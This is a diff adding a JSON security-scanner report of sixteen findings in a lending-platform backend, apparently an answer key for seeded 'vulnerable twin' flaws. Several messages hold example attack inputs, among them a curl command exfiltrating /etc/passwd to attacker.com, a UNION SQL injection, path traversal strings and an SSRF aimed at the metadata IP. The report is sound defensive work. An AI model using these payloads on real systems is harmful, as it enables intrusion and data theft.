@@ -1,0 +1,410 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection-string-concat",
+      "path": "backend/src/routes/borrowers.ts",
+      "start": {
+        "line": 290,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 293,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`region` comes directly from `req.query.region` and is concatenated into a raw SQL string passed to `AppDataSource.query()` without parameterization. An attacker can break out of the ILIKE literal (e.g. `region=%' UNION SELECT ...--`) to exfiltrate arbitrary data from any table, or corrupt the query. Contrast with `searchApplicationsByPurposeKeyword` in applications.ts which correctly uses a parameterized `$1` placeholder for the same pattern.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-execsync",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 198,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 200,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`outputFormat` is taken from `req.query.format` with no validation/allowlist and interpolated directly into a shell command string executed via `execSync`. An attacker can supply e.g. `format=pdf; curl attacker.com/$(cat /etc/passwd)#` to achieve arbitrary OS command execution. The sibling endpoint `renderPortfolioSummary` (line ~226-241) fixes this exact issue by validating `format` against an allowlist and using `execFileSync` with an argument array and `shell:false`, confirming this is the vulnerable twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-authz-financial-account",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 49,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 64,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`designatePrimaryAccount` performs no ownership or role check before promoting an arbitrary `PaymentAccount` (looked up purely by `req.params.id`) to primary and overwriting its `bankName`/`routingNumber` with attacker-supplied values. Any authenticated user (including a borrower) can call `PUT /api/payment-accounts/:id/designate-primary` for any account belonging to any business and redirect that business's future loan disbursement to a bank account of their choosing. Compare to `retirePayoutAccount` just below it, which correctly checks `req.user.role === BORROWER` ownership or requires ADMIN.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.unrestricted-fetch-from-header",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 501,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 519,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`importDocumentTemplateContent` takes a fully attacker-controlled URL from the `x-template-source-url` header and passes it directly to `fetch()` with no host allowlist, enabling SSRF against internal services (e.g. `http://169.254.169.254/...` or `http://core-banking.internal.example.com/...`) and reflecting the response back to the caller. The nearly identical `previewExternalTemplateSource` handler directly below it (line ~534-554) validates the hostname against `ALLOWED_TEMPLATE_HOSTS` before fetching, confirming this is the vulnerable twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unsanitized-filename-read",
+      "path": "backend/src/routes/borrowers.ts",
+      "start": {
+        "line": 238,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 240,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`previewBusinessLetterhead` reads `profile.letterheadFilename` (a value the borrower fully controls via `PUT /api/borrowers/my`, see allowedFields at line 112) and joins it into `LETTERHEAD_DIR` with no path validation before `fs.readFileSync`. A borrower can set `letterheadFilename` to `../../../../etc/passwd` (or any absolute/relative traversal) so that when staff later preview it, arbitrary files on the server are read and returned. The very next handler, `previewBusinessSignature`, resolves the same kind of user-controlled filename and explicitly checks `filePath.startsWith(baseDir + path.sep)` before reading \u2014 confirming this is the unsafe twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unsanitized-filename-write",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 342,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 343,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`stageComplianceNote` joins the caller-supplied `noteFileName` directly into `COMPLIANCE_STAGING_DIR` and writes attacker-controlled `body` content with `fs.writeFileSync`, with no sanitization. A path like `noteFileName=../../../../tmp/evil.js` lets any underwriter/support/admin user write arbitrary files to arbitrary locations on disk. The very next handler, `archiveReviewMemo`, takes the same kind of user-supplied filename but calls `path.basename(memoFileName)` before joining it, confirming this is the unsafe twin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-73: External Control of File Name or Path"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.unsanitized-filename-write",
+      "path": "backend/src/routes/admin.ts",
+      "start": {
+        "line": 522,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 523,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`publishProductBrochure` joins the caller-supplied `fileName` directly into `PRODUCT_ASSETS_DIR` with no sanitization (no `path.basename`, no extension allowlist) before writing attacker-controlled base64 content to disk. An admin-authenticated caller can supply `fileName=../../src/index.ts` or similar to write/overwrite arbitrary files outside the intended assets directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.unvalidated-redirect-header",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 329,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 340,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`continueAfterVerification` builds the redirect target directly from the client-controlled `x-redirect-url` header (or `referer`) with no allowlist/host validation, then calls `res.redirect(nextUrl)`. An attacker can send an authenticated user to `GET /api/auth/continue` with `x-redirect-url: https://evil.example.com/phish` to redirect them off-site (useful for phishing after a legitimate-looking auth flow). Compare to `returnToQueue` in applications.ts, which restricts its redirect target to a fixed `QUEUE_RETURN_PATHS` allowlist, confirming this is the unsafe twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site (Open Redirect)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-unescaped-filter",
+      "path": "backend/src/routes/admin.ts",
+      "start": {
+        "line": 364,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 365,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`findEmployeeByBadgeId` builds an LDAP filter by interpolating the raw `badge_id` query parameter (`(uid=${badgeId})`) with no escaping, and passes it to `staffDirectoryClient.search`. An attacker (any admin-role account) can inject filter syntax such as `badge_id=*)(memberOf=*` to widen the match or exfiltrate unrelated directory entries. The sibling handler `verifyComplianceGroupMembership` right below it escapes the same kind of input with `ldapEscape(email)` before building its filter, confirming this is the unsafe twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: LDAP Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.header-based-auth-bypass",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 332,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 351,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`checkPartnerLedgerAccess` grants ledger-partner access based solely on the client-supplied `x-partner-role` request header (`partnerRole == \"ledger-service\"`), with no signature, shared secret, or `authenticate` middleware verifying the caller's identity. Any external caller can set this header to `ledger-service` to pass the check and page through payment account records.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.jwt-ignore-expiration",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 176,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 176,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`resumeLedgerSyncSession` verifies the ledger-sync session token with `{ ignoreExpiration: true }`, meaning a token issued with a 10-minute `expiresIn` (see `startLedgerSyncSession`) remains valid forever if leaked. The nearly identical `resumeDisbursementSyncSession` below (line ~240) verifies the same kind of token without `ignoreExpiration`, correctly enforcing expiry, confirming this is the unsafe twin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.padding-oracle-error-disclosure",
+      "path": "backend/src/routes/payment-accounts.ts",
+      "start": {
+        "line": 309,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 311,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`confirmPayoutDraft` decrypts caller-supplied ciphertext with AES-256-CBC (no MAC/authenticated encryption) and, on a padding failure, returns the raw `padErr.message` in the response body distinctly from the generic 'Malformed draft token' error used for all other failures. This distinguishable padding-error oracle allows a classic CBC padding-oracle attack to decrypt or forge the encrypted bank-account draft token without knowing `PAYOUT_DRAFT_KEY`. Contrast with the counteroffer resume token in decisions.ts, which uses AES-256-GCM (authenticated encryption) and returns one generic error for any failure.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-696: Incorrect Behavior Order"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.cleartext-secret-in-url",
+      "path": "backend/src/utils/core-banking.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`initiateDisbursement` sends the core-banking `api_key` and the disbursement amount/account/application identifiers as URL query parameters over `CORE_BANKING_BASE_URL`, whose default and typical configured value is a plain `http://` URL \u2014 unlike `registerLedgerAccount` just below it, which explicitly upgrades the same base URL to `https:` before calling. Sending a long-lived API key and financial transaction data in a GET query string over cleartext HTTP exposes the secret and transaction details to network intermediaries and to logs/proxies that record request URLs.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-319: Cleartext Transmission of Sensitive Information",
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.unsanitized-content-disposition",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 427,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 438,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`exportDocumentPackage` builds the `Content-Disposition` header filename directly from the unsanitized `export_name` query parameter. The sibling handler `downloadReviewMemoPackage` (line ~468-480) takes the analogous `document_title` query parameter and explicitly strips `\\r\\n` with `.replace(/[\\r\\n]/g, \"\")` before using it in the same header, confirming the missing sanitization here is the unsafe twin and can be used to inject unexpected header/response content depending on the HTTP stack's leniency.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.debug-header-stack-trace-leak",
+      "path": "backend/src/routes/applications.ts",
+      "start": {
+        "line": 452,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 453,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`getRiskWorksheet` returns the raw error message, stack trace, and request params to the client whenever the request includes the header `x-branch-context: expanded` \u2014 a value fully controlled by the caller, not gated by environment or role. This lets any authorized underwriter/admin (or anyone who discovers the header) trigger verbose internal error disclosure at will.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.object-assign-request-body",
+      "path": "backend/src/routes/admin.ts",
+      "start": {
+        "line": 194,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 194,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`Object.assign(product, req.body)` (and the same pattern used for product creation at line 168 and document templates at lines 251/267) merges the entire request body onto the TypeORM entity with no field allowlist, letting the caller set any column the entity defines. Other mutation endpoints in this codebase (e.g. `borrowers.ts` PUT /my and `applications.ts` PUT /:id) explicitly enumerate an `allowedFields` list before assignment, confirming this pattern is the unsafe outlier.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
